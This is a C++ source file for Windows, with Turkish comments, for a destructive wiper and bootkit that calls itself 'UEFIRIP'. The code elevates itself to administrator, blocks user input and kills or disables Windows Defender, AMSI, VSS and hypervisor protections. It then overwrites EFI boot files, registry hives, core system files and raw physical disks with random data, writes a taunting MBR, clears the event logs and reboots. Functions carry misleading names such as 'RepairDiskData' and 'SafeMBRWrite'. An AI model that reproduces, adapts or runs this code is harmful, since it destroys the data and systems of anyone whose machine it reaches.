#define _WIN32_WINNT 0x0600
#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>
#include <vector>
#include <random>
#include <chrono>
#include <sstream>
#include <map>
#include <tlhelp32.h>
#include <ctime>
#include <iomanip>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

// =====================================================================
// YARDIMCI FONKSİYONLAR
// =====================================================================
bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin == TRUE;
}

void RestartAsAdmin() {
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    ShellExecuteA(NULL, "runas", szPath, NULL, NULL, SW_SHOWNORMAL);
    exit(0);
}

void RunCommand(const std::string& cmd) {
    std::string fullCmd = "cmd.exe /c " + cmd + " >nul 2>&1";
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    if (CreateProcessA(NULL, const_cast<char*>(fullCmd.c_str()), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

std::vector<char> GetGarbage(size_t size) {
    std::vector<char> data(size);
    std::mt19937 rng(std::random_device{}());
    std::uniform_int_distribution<int> dist(0, 255);
    for (auto& c : data) c = dist(rng);
    return data;
}

std::string RandomHex(size_t len) {
    std::string s;
    const char* hex = "0123456789abcdef";
    for (size_t i = 0; i < len; i++) s += hex[rand() % 16];
    return s;
}

// =====================================================================
// TEK SATIR LOG FONKSİYONU
// =====================================================================
void Log(const std::string& msg, bool success = true) {
    std::cout << msg << (success ? " basarili..." : " basarisiz!") << std::endl;
}

// =====================================================================
// EKSTRA DONANIM / KERNEL SEVİYESİ FONKSİYONLAR
// =====================================================================
void EnableDebugPrivilege() {
    HANDLE hToken; LUID luid; TOKEN_PRIVILEGES tp;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
        CloseHandle(hToken);
    }
}

void KillProcessByName(const wchar_t* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, processName) == 0) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProcess) { TerminateProcess(hProcess, 0); CloseHandle(hProcess); }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
}

void StopServiceAPI(const wchar_t* serviceName) {
    SC_HANDLE schSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (schSCManager) {
        SC_HANDLE schService = OpenServiceW(schSCManager, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
        if (schService) { SERVICE_STATUS ssStatus; ControlService(schService, SERVICE_CONTROL_STOP, &ssStatus); CloseHandle(schService); }
        CloseHandle(schSCManager);
    }
}

void DestroyHypervisor() {
    Log("Hypervisor devre disi birakiliyor");
    RunCommand("bcdedit /set hypervisorlaunchtype off");
    RunCommand("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity /v Enabled /t REG_DWORD /d 0 /f");
    RunCommand("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f");
    Log("Hypervisor devre disi birakildi");
}

void LockAndDestroyNVRAM() {
    Log("NVRAM degiskenleri eziliyor");
    if (system("mountvol X: /s >nul 2>&1") == 0) {
        auto data = GetGarbage(1048576 * 5);
        std::vector<std::string> nvramFiles = {
            "X:\\EFI\\Microsoft\\Boot\\BCD", "X:\\EFI\\BOOT\\BOOTX64.EFI",
            "X:\\EFI\\Variable\\NVARS.dat", "X:\\EFI\\Variable\\VARS.dat",
            "X:\\EFI\\Variable\\var1.dat", "X:\\EFI\\Variable\\var2.dat",
            "X:\\EFI\\Variable\\var3.dat", "X:\\EFI\\Variable\\var4.dat"
        };
        for (const auto& f : nvramFiles) {
            std::ofstream out(f, std::ios::binary);
            if (out.is_open()) { out.write(data.data(), data.size()); out.close(); }
        }
        system("mountvol X: /d >nul 2>&1");
        Log("NVRAM ezildi");
    }
}

void DestroyBIOSFirmware() {
    Log("BIOS/SPI Flash dosyalari bozuluyor");
    auto data = GetGarbage(1048576 * 15);
    data[0] = 'M'; data[1] = 'Z';
    std::vector<std::string> paths = {
        "C:\\Windows\\System32\\Firmware\\bios.bin",
        "C:\\Windows\\System32\\Firmware\\spi_flash.bin",
        "C:\\Windows\\System32\\Firmware\\me.bin",
        "C:\\Windows\\System32\\Firmware\\uefi.bin",
        "C:\\Windows\\System32\\Firmware\\bios_update.bin"
    };
    for (const auto& p : paths) {
        std::ofstream f(p, std::ios::binary);
        if (f.is_open()) { f.write(data.data(), data.size()); f.close(); }
    }
    Log("BIOS/SPI Flash bozuldu");
}

void LockAndDestroyDisk(int driveNum) {
    Log("Raw Disk " + std::to_string(driveNum) + " kilitleniyor");
    std::wstring drivePath = L"\\\\.\\PhysicalDrive" + std::to_wstring(driveNum);
    HANDLE hDisk = CreateFileW(drivePath.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesReturned;
        DeviceIoControl(hDisk, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &bytesReturned, NULL);
        DeviceIoControl(hDisk, FSCTL_DISMOUNT_VOLUME, NULL, 0, NULL, 0, &bytesReturned, NULL);
        DWORD bytesWritten;
        auto garbage = GetGarbage(512 * 1024);
        SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
        WriteFile(hDisk, garbage.data(), garbage.size(), &bytesWritten, NULL);
        for (int i = 0; i < 50; i++) {
            SetFilePointer(hDisk, (rand() % 100000) * 512, NULL, FILE_BEGIN);
            WriteFile(hDisk, garbage.data(), garbage.size(), &bytesWritten, NULL);
        }
        CloseHandle(hDisk);
        Log("Raw Disk " + std::to_string(driveNum) + " ezildi");
    }
    else {
        Log("Raw Disk " + std::to_string(driveNum) + " erisilemedi", false);
    }
}

// =====================================================================
// MBR'YE ASSEMBLY YAZMA
// =====================================================================
void SafeMBRWrite() {
    Log("MBR'ye Assembly bootloader yaziliyor");
    unsigned char mbr[512] = { 0 };
    int i = 0;

    mbr[i++] = 0xFA;
    mbr[i++] = 0x31; mbr[i++] = 0xC0;
    mbr[i++] = 0x8E; mbr[i++] = 0xC0;
    mbr[i++] = 0xB8; mbr[i++] = 0x00; mbr[i++] = 0xB8;
    mbr[i++] = 0x8E; mbr[i++] = 0xC0;
    mbr[i++] = 0xBF; mbr[i++] = 0x00; mbr[i++] = 0x00;

    const char* msg1 = "hi user! ";
    for (int j = 0; j < strlen(msg1); j++) { mbr[i++] = 0xB8; mbr[i++] = msg1[j]; mbr[i++] = 0x0F; mbr[i++] = 0xAB; }
    const char* msg2 = "your pc is fucked by ";
    for (int j = 0; j < strlen(msg2); j++) { mbr[i++] = 0xB8; mbr[i++] = msg2[j]; mbr[i++] = 0x0B; mbr[i++] = 0xAB; }
    const char* msg3 = "UEFIRIP Bootkit. ";
    for (int j = 0; j < strlen(msg3); j++) { mbr[i++] = 0xB8; mbr[i++] = msg3[j]; mbr[i++] = 0x0C; mbr[i++] = 0xAB; }
    const char* msg4 = "My Instagram And TikTok:";
    for (int j = 0; j < strlen(msg4); j++) { mbr[i++] = 0xB8; mbr[i++] = msg4[j]; mbr[i++] = 0x05; mbr[i++] = 0xAB; }
    const char* msg5 = "arasswys";
    for (int j = 0; j < strlen(msg5); j++) { mbr[i++] = 0xB8; mbr[i++] = msg5[j]; mbr[i++] = 0x0A; mbr[i++] = 0xAB; }

    int music_start = i;
    mbr[i++] = 0xB0; mbr[i++] = 0xB6; mbr[i++] = 0xE6; mbr[i++] = 0x43;
    unsigned char notes[][4] = { { 0x00, 0x50, 0x00, 0x04 },{ 0x00, 0x10, 0x00, 0x02 } };
    for (int k = 0; k < 2; k++) {
        mbr[i++] = 0xB0; mbr[i++] = notes[k][0]; mbr[i++] = 0xE6; mbr[i++] = 0x42;
        mbr[i++] = 0xB0; mbr[i++] = notes[k][1]; mbr[i++] = 0xE6; mbr[i++] = 0x42;
        mbr[i++] = 0xE4; mbr[i++] = 0x61; mbr[i++] = 0x0C; mbr[i++] = 0x03; mbr[i++] = 0xE6; mbr[i++] = 0x61;
        mbr[i++] = 0xB9; mbr[i++] = notes[k][2]; mbr[i++] = notes[k][3]; mbr[i++] = 0xE2; mbr[i++] = 0xFE;
        mbr[i++] = 0xE4; mbr[i++] = 0x61; mbr[i++] = 0x24; mbr[i++] = 0xFC; mbr[i++] = 0xE6; mbr[i++] = 0x61;
    }
    int jump_distance = i - music_start + 2;
    mbr[i++] = 0xEB; mbr[i++] = (unsigned char)(-jump_distance);

    mbr[510] = 0x55; mbr[511] = 0xAA;

    HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
        WriteFile(hDisk, mbr, 512, &bytesWritten, NULL);
        CloseHandle(hDisk);
        Log("MBR'ye yazildi");
    }
    else {
        Log("MBR'ye yazilamadi", false);
    }
}

// =====================================================================
// PYTHON'DAKİ DİĞER FONKSİYONLAR
// =====================================================================
void AddCertificateMetadata() {
    Log("Sertifika metadatasi ekleniyor");
    std::string cert = "CN=TechCorp" + std::to_string(rand() % 9000 + 1000) + ", OU=IT, O=TechInc, C=US";
    std::string path = "C:\\Windows\\Temp\\cert_" + std::to_string(rand() % 9000 + 1000) + ".cer";
    std::ofstream f(path);
    if (f.is_open()) { f << "-----BEGIN CERTIFICATE-----\n" << cert << "\n-----END CERTIFICATE-----"; f.close(); }
    Log("Sertifika eklendi");
}

void SecurityBypass() {
    Log("Guvenlik atlatiliyor");
    std::vector<std::string> cmds = {
        "powershell -ep bypass -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
        "powershell -ep bypass -c \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableArchiveScanning $true\"",
        "powershell -ep bypass -c \"Set-MpPreference -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true\"",
        "powershell -ep bypass -c \"Set-MpPreference -DisableBlockAtFirstSeen $true -DisablePrivacyMode $true\"",
        "powershell -ep bypass -c \"Stop-Service -Name WinDefend -Force\"",
        "sc delete WinDefend",
        "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All"
    };
    for (const auto& cmd : cmds) RunCommand(cmd);
    Log("Guvenlik atlatildi");
}

void CreateBootloaders() {
    Log("EFI Bootloader'lari eziliyor");
    if (system("mountvol X: /s >nul 2>&1") == 0) {
        auto data = GetGarbage(1048576); data[0] = 'M'; data[1] = 'Z';
        std::vector<std::string> paths = {
            "X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", "X:\\EFI\\Boot\\bootx64.efi",
            "X:\\EFI\\Boot\\grubx64.efi", "X:\\EFI\\Boot\\boot_update.efi",
            "X:\\Recovery\\WindowsRE\\reagentc_update.exe"
        };
        for (const auto& p : paths) { std::ofstream f(p, std::ios::binary); if (f.is_open()) { f.write(data.data(), data.size()); f.close(); } }
        system("mountvol X: /d >nul 2>&1");
        Log("Bootloader'lar ezildi");
    }
}

void CreateEFIVars() {
    Log("NVRAM dosyalari dolduruluyor");
    if (system("mountvol X: /s >nul 2>&1") == 0) {
        auto data = GetGarbage(1048576 * 5);
        std::vector<std::string> vars = { "vars.dat", "var1.dat", "var2.dat", "var3.dat", "var4.dat", "var5.dat", "var6.dat", "var7.dat" };
        for (const auto& v : vars) { std::ofstream f("X:\\EFI\\Variable\\" + v, std::ios::binary); if (f.is_open()) { f.write(data.data(), data.size()); f.close(); } }
        system("mountvol X: /d >nul 2>&1");
        Log("NVRAM dosyalari dolduruldu");
    }
}

void UpdateFirmwareVars() {
    Log("Firmware dosyalari dolduruluyor");
    if (system("mountvol X: /s >nul 2>&1") == 0) {
        auto data = GetGarbage(1048576 * 5);
        std::vector<std::string> vars = { "firmware_vars.dat", "spi_flash.dat", "uefi_store.dat" };
        for (const auto& v : vars) { std::ofstream f("X:\\EFI\\Variable\\" + v, std::ios::binary); if (f.is_open()) { f.write(data.data(), data.size()); f.close(); } }
        system("mountvol X: /d >nul 2>&1");
        Log("Firmware dosyalari dolduruldu");
    }
}

void CreateFirmwareUpdates() {
    Log("BIOS/SPI/ME dosyalari olusturuluyor");
    auto data = GetGarbage(1048576 * 15); data[0] = 'M'; data[1] = 'Z';
    std::vector<std::string> paths = {
        "C:\\Windows\\System32\\Firmware\\bios_update.bin", "C:\\Windows\\System32\\Firmware\\spi_flash.bin",
        "C:\\ProgramData\\FirmwareUpdate\\firmware.rom", "C:\\Windows\\System32\\nvram_update.dat",
        "C:\\Windows\\System32\\Intel\\ME\\me_update.bin"
    };
    for (const auto& p : paths) { std::ofstream f(p, std::ios::binary); if (f.is_open()) { f.write(data.data(), data.size()); f.close(); } }
    Log("BIOS/SPI/ME dosyalari olusturuldu");
}

void UpdateFirmwareRegistry() {
    Log("Firmware Registry anahtarlari bozuluyor");
    for (int i = 0; i < 5; i++) {
        std::string key = "FirmwareUpdate" + std::to_string(rand() % 9000 + 1000);
        RunCommand("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareResources /v " + key + " /t REG_SZ /d FirmwareData /f");
        RunCommand("reg add HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v " + key + " /t REG_SZ /d BIOSData /f");
        RunCommand("reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion /v " + key + " /t REG_SZ /d VersionData /f");
        RunCommand("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v " + key + " /t REG_SZ /d C:\\Windows\\System32\\update.exe /f");
    }
    Log("Firmware Registry bozuldu");
}

void CreateCOMObjects() {
    Log("Sahte COM objeleri olusturuluyor");
    for (int i = 0; i < 5; i++) {
        std::string clsid = "{" + RandomHex(4) + "-" + RandomHex(4) + "-" + RandomHex(4) + "-" + RandomHex(4) + "-" + RandomHex(12) + "}";
        RunCommand("reg add HKLM\\SOFTWARE\\Classes\\CLSID\\" + clsid + " /v LocalServerName /t REG_SZ /d COMUpdate /f");
    }
    Log("COM objeleri olusturuldu");
}

void CreateBootChain() {
    Log("BCD zinciri yikiliyor");
    for (int i = 0; i < 10; i++) {
        std::string id = "{bootupdate" + std::to_string(rand() % 9000 + 1000) + "}";
        RunCommand("bcdedit /create " + id + " /d BootUpdate /application osloader");
        RunCommand("bcdedit /set " + id + " path \\EFI\\Boot\\boot_update.efi");
        RunCommand("bcdedit /set {bootmgr} displayorder " + id);
    }
    RunCommand("bcdedit /set {bootmgr} path \\boot_update.efi");
    Log("BCD zinciri kirildi");
}

void RepairDiskData() {
    Log("Disk sektorleri eziliyor");
    for (int i = 0; i < 8; i++) {
        std::string drive = "\\\\.\\PhysicalDrive" + std::to_string(i);
        HANDLE hDisk = CreateFileA(drive.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hDisk != INVALID_HANDLE_VALUE) {
            DWORD bytesWritten; int loops = (i == 0) ? 30 : 15;
            for (int j = 0; j < loops; j++) {
                auto data = GetGarbage(512 * 3000);
                SetFilePointer(hDisk, (rand() % 100000) * 512, NULL, FILE_BEGIN);
                WriteFile(hDisk, data.data(), data.size(), &bytesWritten, NULL);
            }
            if (i == 0) {
                auto mbrData = GetGarbage(512 * 10000);
                SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
                WriteFile(hDisk, mbrData.data(), mbrData.size(), &bytesWritten, NULL);
            }
            CloseHandle(hDisk);
        }
    }
    Log("Disk sektorleri ezildi");
}

void UpdateRegistry() {
    Log("Registry anahtarlari bozuluyor");
    for (int i = 0; i < 10; i++) {
        std::string key = "SystemUpdate" + std::to_string(rand() % 9000 + 1000);
        RunCommand("reg add HKLM\\SOFTWARE\\Microsoft\\Windows /v " + key + " /t REG_SZ /d DataUpdate /f");
        RunCommand("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\ServiceUpdate" + std::to_string(rand() % 9000 + 1000) + " /v ImagePath /t REG_SZ /d \\SystemRoot\\System32\\update.sys /f");
        RunCommand("reg add HKLM\\SYSTEM\\Setup /v " + key + " /t REG_SZ /d SetupUpdate /f");
        RunCommand("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows /v " + key + " /t REG_SZ /d PolicyUpdate /f");
    }
    RunCommand("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute /f");
    Log("Registry bozuldu");
}

void UpdateSystemFiles() {
    Log("Kritik sistem dosyalari eziliyor");
    std::vector<std::string> files = {
        "C:\\Windows\\System32\\winload.efi", "C:\\Windows\\System32\\bootmgr",
        "C:\\Windows\\System32\\config\\SYSTEM", "C:\\Windows\\System32\\config\\SOFTWARE",
        "C:\\Windows\\System32\\config\\RegBack\\SYSTEM", "C:\\Windows\\System32\\config\\RegBack\\SOFTWARE",
        "C:\\Windows\\System32\\ntoskrnl.exe", "C:\\Windows\\System32\\hal.dll",
        "C:\\Windows\\System32\\drivers\\ntfs.sys", "C:\\Windows\\System32\\winlogon.exe",
        "C:\\Windows\\System32\\smss.exe", "C:\\Windows\\System32\\drivers\\volmgr.sys"
    };
    auto data = GetGarbage(1024);
    for (const auto& f : files) {
        if (GetFileAttributesA(f.c_str()) != INVALID_FILE_ATTRIBUTES) {
            RunCommand("takeown /f \"" + f + "\" >nul 2>&1");
            RunCommand("icacls \"" + f + "\" /grant Administrators:F >nul 2>&1");
            std::fstream fs(f, std::ios::in | std::ios::out | std::ios::binary);
            if (fs.is_open()) { fs.seekp(0, std::ios::beg); fs.write(data.data(), data.size()); fs.close(); }
        }
    }
    Log("Sistem dosyalari ezildi");
}

void InstallDriver() {
    Log("Sahte surucu kuruluyor");
    std::string path = "C:\\Windows\\System32\\drivers\\driver_update" + std::to_string(rand() % 9000 + 1000) + ".sys";
    auto data = GetGarbage(1048576); data[0] = 'M'; data[1] = 'Z';
    std::ofstream f(path, std::ios::binary);
    if (f.is_open()) { f.write(data.data(), data.size()); f.close(); }
    RunCommand("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\DriverUpdate" + std::to_string(rand() % 9000 + 1000) + " /v ImagePath /t REG_SZ /d " + path + " /f");
    Log("Surucu kuruldu");
}

void CreateBootFiles() {
    Log("Boot dosyalari olusturuluyor");
    std::ofstream bootIni("C:\\boot.ini");
    if (bootIni.is_open()) { bootIni << "[boot loader]\ntimeout=0\ndefault=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS\n"; bootIni.close(); }
    auto data = GetGarbage(512); data[0] = 'M'; data[1] = 'Z';
    std::ofstream bootsect("C:\\bootsect.bak", std::ios::binary);
    if (bootsect.is_open()) { bootsect.write(data.data(), data.size()); bootsect.close(); }
    Log("Boot dosyalari olusturuldu");
}

void CreateUpdateFiles() {
    Log("Sahte guncelleme dosyalari olusturuluyor");
    std::string path = "C:\\Windows\\SoftwareDistribution\\Download\\update" + std::to_string(rand() % 9000 + 1000) + ".dat";
    auto data = GetGarbage(1048576 * 15);
    std::ofstream f(path, std::ios::binary);
    if (f.is_open()) { f.write(data.data(), data.size()); f.close(); }
    Log("Guncelleme dosyalari olusturuldu");
}

void RepairFilesystemMetadata() {
    Log("Dosya sistemi metadatasi onariliyor");
    RunCommand("fsutil fsinfo ntfsinfo C:");
    RunCommand("fsutil file createnew C:\\fs_update_" + std::to_string(rand() % 9000 + 1000) + ".dat " + std::to_string(1048576 * 5));
    Log("Dosya sistemi metadatasi onarildi");
}

void SystemReboot() {
    Log("Sistem 10 saniye icinde yeniden baslatiliyor");
    RunCommand("shutdown /r /t 10"); // 10 saniye sonra restart
}

void StartRepair() {
    Log("ARASLOXXER UEFIRIP baslatildi");
    Log("Klavye ve mouse kilitleniyor");
    BlockInput(TRUE); // Klavye ve mouse kilitleniyor

    EnableDebugPrivilege();
    KillProcessByName(L"MsMpEng.exe");
    KillProcessByName(L"MsSense.exe");
    KillProcessByName(L"NisSrv.exe");
    KillProcessByName(L"vssvc.exe");
    StopServiceAPI(L"WinDefend");
    StopServiceAPI(L"VSS");
    StopServiceAPI(L"swprv");
    StopServiceAPI(L"WSearch");
    Log("Guvenlik surecleri olduruldu");

    bool isUEFI = (system("mountvol X: /s >nul 2>&1") == 0);

    if (isUEFI) {
        Log("UEFI/GPT tespit edildi");
        DestroyHypervisor();
        AddCertificateMetadata();
        SecurityBypass();
        CreateBootloaders();
        CreateEFIVars();
        UpdateFirmwareVars();
        CreateFirmwareUpdates();
        UpdateFirmwareRegistry();
        CreateCOMObjects();
        CreateBootChain();
        UpdateRegistry();
        UpdateSystemFiles();
        InstallDriver();
        CreateBootFiles();
        CreateUpdateFiles();
        RepairFilesystemMetadata();
        RepairDiskData();

        LockAndDestroyNVRAM();
        DestroyBIOSFirmware();

        SafeMBRWrite();

        for (int i = 0; i < 8; i++) LockAndDestroyDisk(i);
    }
    else {
        Log("Legacy MBR tespit edildi");
        SafeMBRWrite();
    }

    RunCommand("wevtutil cl System");
    RunCommand("wevtutil cl Application");
    RunCommand("wevtutil cl Security");
    Log("Loglar temizlendi");

    SystemReboot();
}

int main() {
    if (!IsRunAsAdmin()) {
        RestartAsAdmin();
        return 0;
    }
    srand(time(NULL));
    StartRepair();
    return 0;
}
